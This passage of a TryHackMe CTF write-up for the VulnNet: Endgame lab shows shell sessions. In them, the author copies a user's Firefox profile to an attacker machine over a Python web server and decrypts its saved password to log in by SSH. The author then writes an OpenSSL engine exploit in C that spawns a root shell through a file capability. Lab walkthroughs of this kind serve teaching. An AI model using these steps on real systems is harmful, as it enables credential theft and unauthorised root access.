www-data@vulnnet-endgame:/$ ps -eo pid,user,command
  PID USER     COMMAND
 ...
   326 systemd+ /lib/systemd/systemd-networkd
  410 root     [cryptd]
  482 root     /usr/sbin/acpid
  486 root     /usr/sbin/cron -f
  490 root     /usr/lib/accountsservice/accounts-daemon
  491 avahi    avahi-daemon: running [vulnnet-endgame.local]
  493 message+ /usr/bin/dbus-daemon --system --address=systemd: --nofork --nopid
  497 avahi    avahi-daemon: chroot helper
  506 root     /usr/lib/udisks2/udisksd
  508 syslog   /usr/sbin/rsyslogd -n
  511 root     /usr/sbin/NetworkManager --no-daemon
  514 root     /usr/lib/snapd/snapd
  520 root     /usr/bin/python3 /usr/bin/networkd-dispatcher --run-startup-trigg
  521 root     /lib/systemd/systemd-logind
  522 root     /sbin/wpa_supplicant -u -s -O /run/wpa_supplicant
  529 root     /usr/sbin/ModemManager --filter-policy=strict
  614 root     /usr/lib/policykit-1/polkitd --no-debug
  641 systemd+ /lib/systemd/systemd-resolved
  656 root     /sbin/dhclient -1 -4 -v -pf /run/dhclient.eth0.pid -lf /var/lib/d
  752 root     /usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrad
  780 whoopsie /usr/bin/whoopsie -f
  782 root     /usr/bin/amazon-ssm-agent
  791 kernoops /usr/sbin/kerneloops --test
  796 kernoops /usr/sbin/kerneloops
  812 root     /usr/sbin/sshd -D
  825 root     /usr/sbin/apache2 -k start
  890 root     /usr/bin/ssm-agent-worker
  893 mysql    /usr/sbin/mysqld --daemonize --pid-file=/run/mysqld/mysqld.pid
  933 root     [kworker/0:3-eve]
 1037 root     /usr/sbin/gdm3
 1042 root     gdm-session-worker [pam/gdm-launch-environment]
 1051 gdm      /lib/systemd/systemd --user
 1052 gdm      (sd-pam)
 1063 gdm      /usr/lib/gdm3/gdm-wayland-session gnome-session --autostart /usr/
 1065 gdm      /usr/bin/dbus-daemon --session --address=systemd: --nofork --nopi
 1067 gdm      /usr/lib/gnome-session/gnome-session-binary --autostart /usr/shar
 1073 gdm      /usr/bin/gnome-shell
 1081 root     /usr/lib/upower/upowerd
 1088 gdm      /usr/bin/Xwayland :1024 -rootless -terminate -accessx -core -list
 1091 gdm      /usr/lib/at-spi2-core/at-spi-bus-launcher
 1096 gdm      /usr/bin/dbus-daemon --config-file=/usr/share/defaults/at-spi2/ac
 1099 gdm      /usr/lib/at-spi2-core/at-spi2-registryd --use-gnome-session
 1102 gdm      /usr/bin/pulseaudio --daemonize=no
 1104 rtkit    /usr/lib/rtkit/rtkit-daemon
 1115 gdm      ibus-daemon --xim --panel disable
 1118 gdm      /usr/lib/ibus/ibus-dconf
 1121 gdm      /usr/lib/ibus/ibus-x11 --kill-daemon
 1123 gdm      /usr/lib/ibus/ibus-portal
 1133 gdm      /usr/libexec/xdg-permission-store
 1142 gdm      /usr/lib/gnome-settings-daemon/gsd-xsettings
 1149 gdm      /usr/lib/gnome-settings-daemon/gsd-a11y-settings
 1151 gdm      /usr/lib/gnome-settings-daemon/gsd-clipboard
 1153 root     /usr/lib/packagekit/packagekitd
 1154 root     /usr/lib/x86_64-linux-gnu/boltd
 1158 gdm      /usr/lib/gnome-settings-daemon/gsd-color
 1159 gdm      /usr/lib/gnome-settings-daemon/gsd-datetime
 1160 gdm      /usr/lib/gnome-settings-daemon/gsd-housekeeping
 1161 gdm      /usr/lib/gnome-settings-daemon/gsd-keyboard
 1168 gdm      /usr/lib/gnome-settings-daemon/gsd-media-keys
 1171 gdm      /usr/lib/gnome-settings-daemon/gsd-mouse
 1172 gdm      /usr/lib/gnome-settings-daemon/gsd-power
 1175 gdm      /usr/lib/gnome-settings-daemon/gsd-print-notifications
 1176 gdm      /usr/lib/gnome-settings-daemon/gsd-rfkill
 1179 gdm      /usr/lib/gnome-settings-daemon/gsd-screensaver-proxy
 1184 gdm      /usr/lib/gnome-settings-daemon/gsd-sharing
 1186 gdm      /usr/lib/gnome-settings-daemon/gsd-smartcard
 1191 gdm      /usr/lib/ibus/ibus-engine-simple
 1192 gdm      /usr/lib/gnome-settings-daemon/gsd-sound
 1201 gdm      /usr/lib/gnome-settings-daemon/gsd-wacom
 1239 colord   /usr/lib/colord/colord
```

```bash
www-data@vulnnet-endgame:/home/system$ ls -lah
total 92K
drwxr-xr-x 18 system system 4.0K Jun 15  2022 .
drwxr-xr-x  3 root   root   4.0K Jun 14  2022 ..
-rw-------  1 system system 2.1K Jun 15  2022 .ICEauthority
lrwxrwxrwx  1 root   root      9 Jun 14  2022 .bash_history -> /dev/null
-rw-r--r--  1 system system  220 Jun 14  2022 .bash_logout
-rw-r--r--  1 system system 3.7K Jun 14  2022 .bashrc
drwx------ 16 system system 4.0K Jun 14  2022 .cache
drwx------ 14 system system 4.0K Jun 14  2022 .config
drwx------  3 root   root   4.0K Jun 14  2022 .dbus
drwx------  3 system system 4.0K Jun 14  2022 .gnupg
drwx------  2 root   root   4.0K Jun 14  2022 .gvfs
drwx------  3 system system 4.0K Jun 14  2022 .local
drwxr-xr-x  4 system system 4.0K Jun 14  2022 .mozilla
lrwxrwxrwx  1 root   root      9 Jun 14  2022 .mysql_history -> /dev/null
-rw-r--r--  1 system system  807 Jun 14  2022 .profile
-rw-r--r--  1 system system    0 Jun 14  2022 .sudo_as_admin_successful
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Desktop
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Documents
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Downloads
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Music
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Pictures
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Public
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Templates
dr-xr-x---  2 system system 4.0K Jun 14  2022 Utils
drwxr-xr-x  2 system system 4.0K Jun 14  2022 Videos
-rw-------  1 system system   38 Jun 14  2022 user.txt
```

```bash
www-data@vulnnet-endgame:/home/system$ cat user.txt
cat: user.txt: Permission denied
```

<p>

- /home/system/.mozilla/firefox/ ...</p>

```bash
www-data@vulnnet-endgame:/home/system$ find / -type f -user system 2>/dev/null
/home/system/.ICEauthority
/home/system/.mozilla/firefox/2o9vd4oi.default/times.json
/home/system/.mozilla/firefox/Crash Reports/InstallTime20220608170832
/home/system/.mozilla/firefox/8mk7ix79.default-release/cert9.db
/home/system/.mozilla/firefox/8mk7ix79.default-release/shield-preference-experiments.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/ClientAuthRememberList.txt
/home/system/.mozilla/firefox/8mk7ix79.default-release/sessionCheckpoints.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/pkcs11.txt
/home/system/.mozilla/firefox/8mk7ix79.default-release/sessionstore.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/weave/failed/tabs.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/weave/toFetch/tabs.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/extensions.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/places.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/broadcast-listeners.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/compatibility.ini
/home/system/.mozilla/firefox/8mk7ix79.default-release/key4.db
/home/system/.mozilla/firefox/8mk7ix79.default-release/prefs.js
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage/permanent/indexeddb+++fx-devtools/.metadata-v2
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage/permanent/indexeddb+++fx-devtools/idb/478967115deegvatroootlss--cans.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage/permanent/chrome/.metadata-v2
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage/ls-archive.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage/default/moz-extension+++89223684-b05e-4166-bd16-0ac7ff75240c^userContextId=4294967295/.metadata-v2
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage/default/moz-extension+++89223684-b05e-4166-bd16-0ac7ff75240c^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/addonStartup.json.lz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/content-prefs.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/gmp-gmpopenh264/1.8.1.1/gmpopenh264.info
/home/system/.mozilla/firefox/8mk7ix79.default-release/gmp-gmpopenh264/1.8.1.1/libgmpopenh264.so
/home/system/.mozilla/firefox/8mk7ix79.default-release/cookies.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/handlers.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/glean/db/data.safe.bin
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/state.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/session-state.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655227551915.c36c2d70-69ab-4825-a869-d1cf44101762.main.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655227279064.9c2967de-2510-494b-ad53-476d24f62b9a.main.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655225825589.2458bd0f-e3a7-4e76-b901-115bf83d18ad.event.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655227279026.2c23785b-d643-4513-bb6b-8948138ee211.event.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655227279076.c27d3c87-0a9e-4e02-abd9-ebdf8622012f.first-shutdown.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655228231567.e955d2af-9f56-4535-a9cf-f9d9868e033b.health.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655227551817.a39cc4a9-7b86-4740-a9dc-790385941fcf.health.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655228231472.df52934c-5e24-466f-a85d-eb140c9d2f9a.health.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655227551869.51d3612d-90f0-40e2-84bf-df112ac8fe16.event.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655228231574.608f6b9f-d82a-4701-90e2-ead12f920dd5.main.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655228231550.49e0d2f0-9780-4e75-b40e-ae927de3bdcf.event.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655227551896.d4cb0e77-bf01-4284-9769-fd9021e82523.health.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/datareporting/archived/2022-06/1655224025574.b86dbac0-0d09-4310-afc2-d339c461e3c0.new-profile.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/search.json.mozlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/AlternateServices.txt
/home/system/.mozilla/firefox/8mk7ix79.default-release/.parentlock
/home/system/.mozilla/firefox/8mk7ix79.default-release/storage.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/xulstore.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/crashes/store.json.mozlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/settings/data.safe.bin
/home/system/.mozilla/firefox/8mk7ix79.default-release/sessionstore-backups/upgrade.jsonlz4-20220608170832
/home/system/.mozilla/firefox/8mk7ix79.default-release/sessionstore-backups/previous.jsonlz4
/home/system/.mozilla/firefox/8mk7ix79.default-release/extension-preferences.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/addons.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/saved-telemetry-pings/2c23785b-d643-4513-bb6b-8948138ee211
/home/system/.mozilla/firefox/8mk7ix79.default-release/saved-telemetry-pings/df52934c-5e24-466f-a85d-eb140c9d2f9a
/home/system/.mozilla/firefox/8mk7ix79.default-release/saved-telemetry-pings/c36c2d70-69ab-4825-a869-d1cf44101762
/home/system/.mozilla/firefox/8mk7ix79.default-release/saved-telemetry-pings/d4cb0e77-bf01-4284-9769-fd9021e82523
/home/system/.mozilla/firefox/8mk7ix79.default-release/saved-telemetry-pings/a39cc4a9-7b86-4740-a9dc-790385941fcf
/home/system/.mozilla/firefox/8mk7ix79.default-release/saved-telemetry-pings/e955d2af-9f56-4535-a9cf-f9d9868e033b
/home/system/.mozilla/firefox/8mk7ix79.default-release/saved-telemetry-pings/608f6b9f-d82a-4701-90e2-ead12f920dd5
/home/system/.mozilla/firefox/8mk7ix79.default-release/saved-telemetry-pings/9c2967de-2510-494b-ad53-476d24f62b9a
/home/system/.mozilla/firefox/8mk7ix79.default-release/saved-telemetry-pings/49e0d2f0-9780-4e75-b40e-ae927de3bdcf
/home/system/.mozilla/firefox/8mk7ix79.default-release/saved-telemetry-pings/51d3612d-90f0-40e2-84bf-df112ac8fe16
/home/system/.mozilla/firefox/8mk7ix79.default-release/saved-telemetry-pings/c27d3c87-0a9e-4e02-abd9-ebdf8622012f
/home/system/.mozilla/firefox/8mk7ix79.default-release/protections.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/security_state/data.safe.bin
/home/system/.mozilla/firefox/8mk7ix79.default-release/favicons.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/formhistory.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/permissions.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/enumerate_devices.txt
/home/system/.mozilla/firefox/8mk7ix79.default-release/times.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/cert_override.txt
/home/system/.mozilla/firefox/8mk7ix79.default-release/containers.json
/home/system/.mozilla/firefox/8mk7ix79.default-release/webappsstore.sqlite
/home/system/.mozilla/firefox/8mk7ix79.default-release/SiteSecurityServiceState.txt
/home/system/.mozilla/firefox/installs.ini
/home/system/.mozilla/firefox/2fjnrwth.default-release/cert9.db
/home/system/.mozilla/firefox/2fjnrwth.default-release/shield-preference-experiments.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/sessionCheckpoints.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/pkcs11.txt
/home/system/.mozilla/firefox/2fjnrwth.default-release/sessionstore.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/weave/failed/tabs.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/weave/toFetch/tabs.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/bookmarkbackups/bookmarks-2022-06-11_16_Q-MXo69LzkaCMT4UPJEQ2w==.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/extensions.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/places.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/broadcast-listeners.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/compatibility.ini
/home/system/.mozilla/firefox/2fjnrwth.default-release/key4.db
/home/system/.mozilla/firefox/2fjnrwth.default-release/logins.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/prefs.js
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/permanent/indexeddb+++fx-devtools/.metadata-v2
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/permanent/indexeddb+++fx-devtools/idb/478967115deegvatroootlss--cans.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/permanent/chrome/.metadata-v2
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/permanent/chrome/idb/3561288849sdhlie.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/permanent/chrome/idb/3870112724rsegmnoittet-es.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/permanent/chrome/idb/1451318868ntouromlalnodry--epcr.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/permanent/chrome/idb/2918063365piupsah.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/permanent/chrome/idb/1657114595AmcateirvtiSty.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/permanent/chrome/idb/2823318777ntouromlalnodry--naod.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/ls-archive.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/default/https+++www.google.com/.metadata-v2
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/default/https+++www.google.com/ls/usage
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/default/https+++www.google.com/ls/data.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/default/https+++www.mozilla.org/.metadata-v2
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/default/https+++www.mozilla.org/idb/216978974Gnlae.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/default/https+++tryhackme.com/.metadata-v2
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/default/https+++tryhackme.com/ls/usage
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/default/https+++tryhackme.com/ls/data.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/default/moz-extension+++f18624c7-e895-42bc-acc9-b05dcade9636^userContextId=4294967295/.metadata-v2
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage/default/moz-extension+++f18624c7-e895-42bc-acc9-b05dcade9636^userContextId=4294967295/idb/3647222921wleabcEoxlt-eengsairo.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/addonStartup.json.lz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/content-prefs.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/gmp-gmpopenh264/1.8.1.1/gmpopenh264.info
/home/system/.mozilla/firefox/2fjnrwth.default-release/gmp-gmpopenh264/1.8.1.1/libgmpopenh264.so
/home/system/.mozilla/firefox/2fjnrwth.default-release/cookies.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/handlers.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/glean/db/data.safe.bin
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/state.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/session-state.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/archived/2022-06/1654970386528.b6617288-5fa7-47f0-b888-374464683b50.main.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/archived/2022-06/1654950141870.4646230b-f0b6-422f-8dca-126ced982f3a.event.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/archived/2022-06/1654947113379.d1be950a-c436-4a7a-980f-10fb0b023b86.main.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/archived/2022-06/1654948341865.076d7943-0204-4c2f-8d1f-782e7d771936.new-profile.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/archived/2022-06/1654969154012.4e9b4235-fc3f-4bdb-94bd-6e4db3cbfeb8.main.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/archived/2022-06/1654968791749.e4b89450-4c3c-436c-a00d-b4eb579b6b0c.event.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/archived/2022-06/1654970386488.ec021f69-2bd1-4413-8562-ac7e6e54eb28.event.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/archived/2022-06/1655110373510.95ba4b46-fe50-4a37-ad77-0cf8732c4cd9.main.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/archived/2022-06/1654952000799.c1a4e45b-8948-4c94-925f-36ac98f7bb13.main.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/archived/2022-06/1655110373499.5500b987-9bdd-4867-881c-0e8fd6050fb4.event.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/datareporting/archived/2022-06/1654968791782.71f36b49-2e68-4e17-9237-db0c14388f9b.main.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/search.json.mozlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/AlternateServices.txt
/home/system/.mozilla/firefox/2fjnrwth.default-release/.parentlock
/home/system/.mozilla/firefox/2fjnrwth.default-release/storage.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/xulstore.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/crashes/store.json.mozlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/sessionstore-backups/previous.jsonlz4
/home/system/.mozilla/firefox/2fjnrwth.default-release/extension-preferences.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/addons.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/saved-telemetry-pings/5500b987-9bdd-4867-881c-0e8fd6050fb4
/home/system/.mozilla/firefox/2fjnrwth.default-release/saved-telemetry-pings/95ba4b46-fe50-4a37-ad77-0cf8732c4cd9
/home/system/.mozilla/firefox/2fjnrwth.default-release/protections.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/security_state/data.safe.bin
/home/system/.mozilla/firefox/2fjnrwth.default-release/favicons.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/formhistory.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/permissions.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/enumerate_devices.txt
/home/system/.mozilla/firefox/2fjnrwth.default-release/times.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/containers.json
/home/system/.mozilla/firefox/2fjnrwth.default-release/webappsstore.sqlite
/home/system/.mozilla/firefox/2fjnrwth.default-release/features/{7f91ed06-a1ff-4eba-8bac-603e2d8dcecf}/webcompat@mozilla.org.xpi
/home/system/.mozilla/firefox/2fjnrwth.default-release/SiteSecurityServiceState.txt
/home/system/.mozilla/firefox/profiles.ini
/home/system/.bashrc
/home/system/user.txt
/home/system/.sudo_as_admin_successful
/home/system/.bash_logout
/home/system/.profile
```

```bash
www-data@vulnnet-endgame:/home/system/.mozilla/firefox$ ls -lah
total 36K
drwxr-xr-x  7 system system 4.0K Jun 14  2022  .
drwxr-xr-x  4 system system 4.0K Jun 14  2022  ..
drwxr-xr-x 13 system system 4.0K Jun 14  2022  2fjnrwth.default-release
drwxr-xr-x  2 system system 4.0K Jun 14  2022  2o9vd4oi.default
drwxr-xr-x 13 system system 4.0K Jun 14  2022  8mk7ix79.default-release
drwxr-xr-x  3 system system 4.0K Jun 14  2022 'Crash Reports'
drwxr-xr-x  2 system system 4.0K Jun 14  2022 'Pending Pings'
-rwxr-xr-x  1 system system   62 Jun 14  2022  installs.ini
-rwxr-xr-x  1 system system  259 Jun 14  2022  profiles.ini
```

```bash
www-data@vulnnet-endgame:/home/system$ zip /tmp/system-mozilla.zip .mozilla -r
```

```bash
www-data@vulnnet-endgame:/home/system$ cd /tmp                                
www-data@vulnnet-endgame:/tmp$ python3 -m http.server
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```bash
:~/VulnNet-Endgame# wget http://xx.xxx.x.xx0/system-mozilla.zip
--2025-09-14 xx:xx:xx--  http://xx.xxx.x.xx/system-mozilla.zip
Connecting to xx.xxx.x.xx:8000... connected.
...
```

```bash
:~/VulnNet-Endgame# unzip system-mozilla.zip
```

```bash
:~/VulnNet-Endgame/.mozilla/firefox# ls
 2fjnrwth.default-release   2o9vd4oi.default   8mk7ix79.default-release  'Crash Reports'   installs.ini  'Pending Pings'   profiles.ini
```

```bash
:~/Desktop/.mozilla/firefox# ls -lah
total 36K
drwxr-xr-x  7 root root 4.0K Jun 14  2022  .
drwxr-xr-x  4 root root 4.0K Jun 14  2022  ..
drwxr-xr-x 13 root root 4.0K Jun 14  2022  2fjnrwth.default-release
drwxr-xr-x  2 root root 4.0K Jun 14  2022  2o9vd4oi.default
drwxr-xr-x 13 root root 4.0K Jun 14  2022  8mk7ix79.default-release
drwxr-xr-x  3 root root 4.0K Jun 14  2022 'Crash Reports'
-rwxr-xr-x  1 root root   62 Jun 14  2022  installs.ini
drwxr-xr-x  2 root root 4.0K Jun 14  2022 'Pending Pings'
-rwxr-xr-x  1 root root  259 Jun 14  2022  profiles.ini
```


<h2>Firefox Decrypt</h2>

<p>

- https://github.com/unode/firefox_decrypt/blob/main/firefox_decrypt.py</p>


```bash
:~/Desktop# python3 firefox_decrypt.py ~/Desktop/.mozilla/firefox/2fjnrwth.default-release
...
Username: 'chris_w@vulnnet.thm'
Password: '*****************'
```

<br>
<h2>system</h2>

```bash
:~# ssh system@xx.xxx.x.xx
system@xx.xxx.x.xx's password: *****************
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-120-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

0 updates can be applied immediately.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Your Hardware Enablement Stack (HWE) is supported until April 2023.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

system@vulnnet-endgame:~$
```


```bash
system@vulnnet-endgame:~$ pwd
/home/system
```

```bash
system@vulnnet-endgame:~$ id
uid=1000(system) gid=1000(system) groups=1000(system)
```

```bash
system@vulnnet-endgame:~$ cat user.txt
THM{*******************************}
```

<br>
<p>1.2. What is the user flag?<br>
<code>THM{*******************************}</code></p>

<br>
<h2>system can´t sudo</h2>

```bash
system@vulnnet-endgame:~$ sudo -l
[sudo] password for system: 
Sorry, user system may not run sudo on vulnnet-endgame.
```

<h2>SUID files owned by root</h2>

```bash
system@vulnnet-endgame:~$ find / -uid 0 -perm -4000 -type f 2>/dev/null
bin/ping
/bin/umount
/bin/fusermount
/bin/su
/bin/mount
/opt/VBoxGuestAdditions-6.1.34/bin/VBoxDRMClient
/snap/core18/2128/bin/mount
/snap/core18/2128/bin/ping
/snap/core18/2128/bin/su
/snap/core18/2128/bin/umount
/snap/core18/2128/usr/bin/chfn
/snap/core18/2128/usr/bin/chsh
/snap/core18/2128/usr/bin/gpasswd
/snap/core18/2128/usr/bin/newgrp
/snap/core18/2128/usr/bin/passwd
/snap/core18/2128/usr/bin/sudo
/snap/core18/2128/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core18/2128/usr/lib/openssh/ssh-keysign
/snap/core20/1081/usr/bin/chfn
/snap/core20/1081/usr/bin/chsh
/snap/core20/1081/usr/bin/gpasswd
/snap/core20/1081/usr/bin/mount
/snap/core20/1081/usr/bin/newgrp
/snap/core20/1081/usr/bin/passwd
/snap/core20/1081/usr/bin/su
/snap/core20/1081/usr/bin/sudo
/snap/core20/1081/usr/bin/umount
/snap/core20/1081/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/snap/core20/1081/usr/lib/openssh/ssh-keysign
/snap/snapd/12883/usr/lib/snapd/snap-confine
/usr/bin/passwd
/usr/bin/pkexec
/usr/bin/arping
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/chfn
/usr/bin/chsh
/usr/bin/traceroute6.iputils
/usr/bin/gpasswd
/usr/sbin/pppd
/usr/lib/eject/dmcrypt-get-device
/usr/lib/xorg/Xorg.wrap
/usr/lib/snapd/snap-confine
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
```

<br>
<br>
<h2>Capabilities</h2>

```bash
system@vulnnet-endgame:~$ getcap / -r 2>/dev/null
/home/system/Utils/openssl =ep
/snap/core20/1081/usr/bin/ping = cap_net_raw+ep
/usr/bin/gnome-keyring-daemon = cap_ipc_lock+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

<p>

- https://gtfobins.github.io/gtfobins/openssl/</p>

<img width="1179" height="333" alt="image" src="https://github.com/user-attachments/assets/9f06b6a3-528b-4763-8316-499c31c69aee" />

<br>
<br>

<img width="1141" height="125" alt="image" src="https://github.com/user-attachments/assets/9170f234-66b3-4bb7-a442-e50409772ab1" />

<br>
<br>
<p>

- hhttps://morgan-bin-bash.gitbook.io/linux-privilege-escalation/openssl-privilege-escalation</p>

<img width="1173" height="717" alt="image" src="https://github.com/user-attachments/assets/f38c9dbc-1cab-49bf-a909-5363b0411ca2" />

<br>
<br>

<p><em>exploit.c</em></p>

```bash
:~/Desktop# cat exploit.c
#include <openssl/engine.h>

static int bind(ENGINE *e, const char *id) {
    setuid(0); setgid(0);
    system("/bin/bash");
}

IMPLEMENT_DYNAMIC_BIND_FN(bind)
IMPLEMENT_DYNAMIC_CHECK_FN()
```

```bash
:~/Desktop# gcc -fPIC -o exploit.o -c exploit.c
exploit.c: In function \u2018bind\u2019:
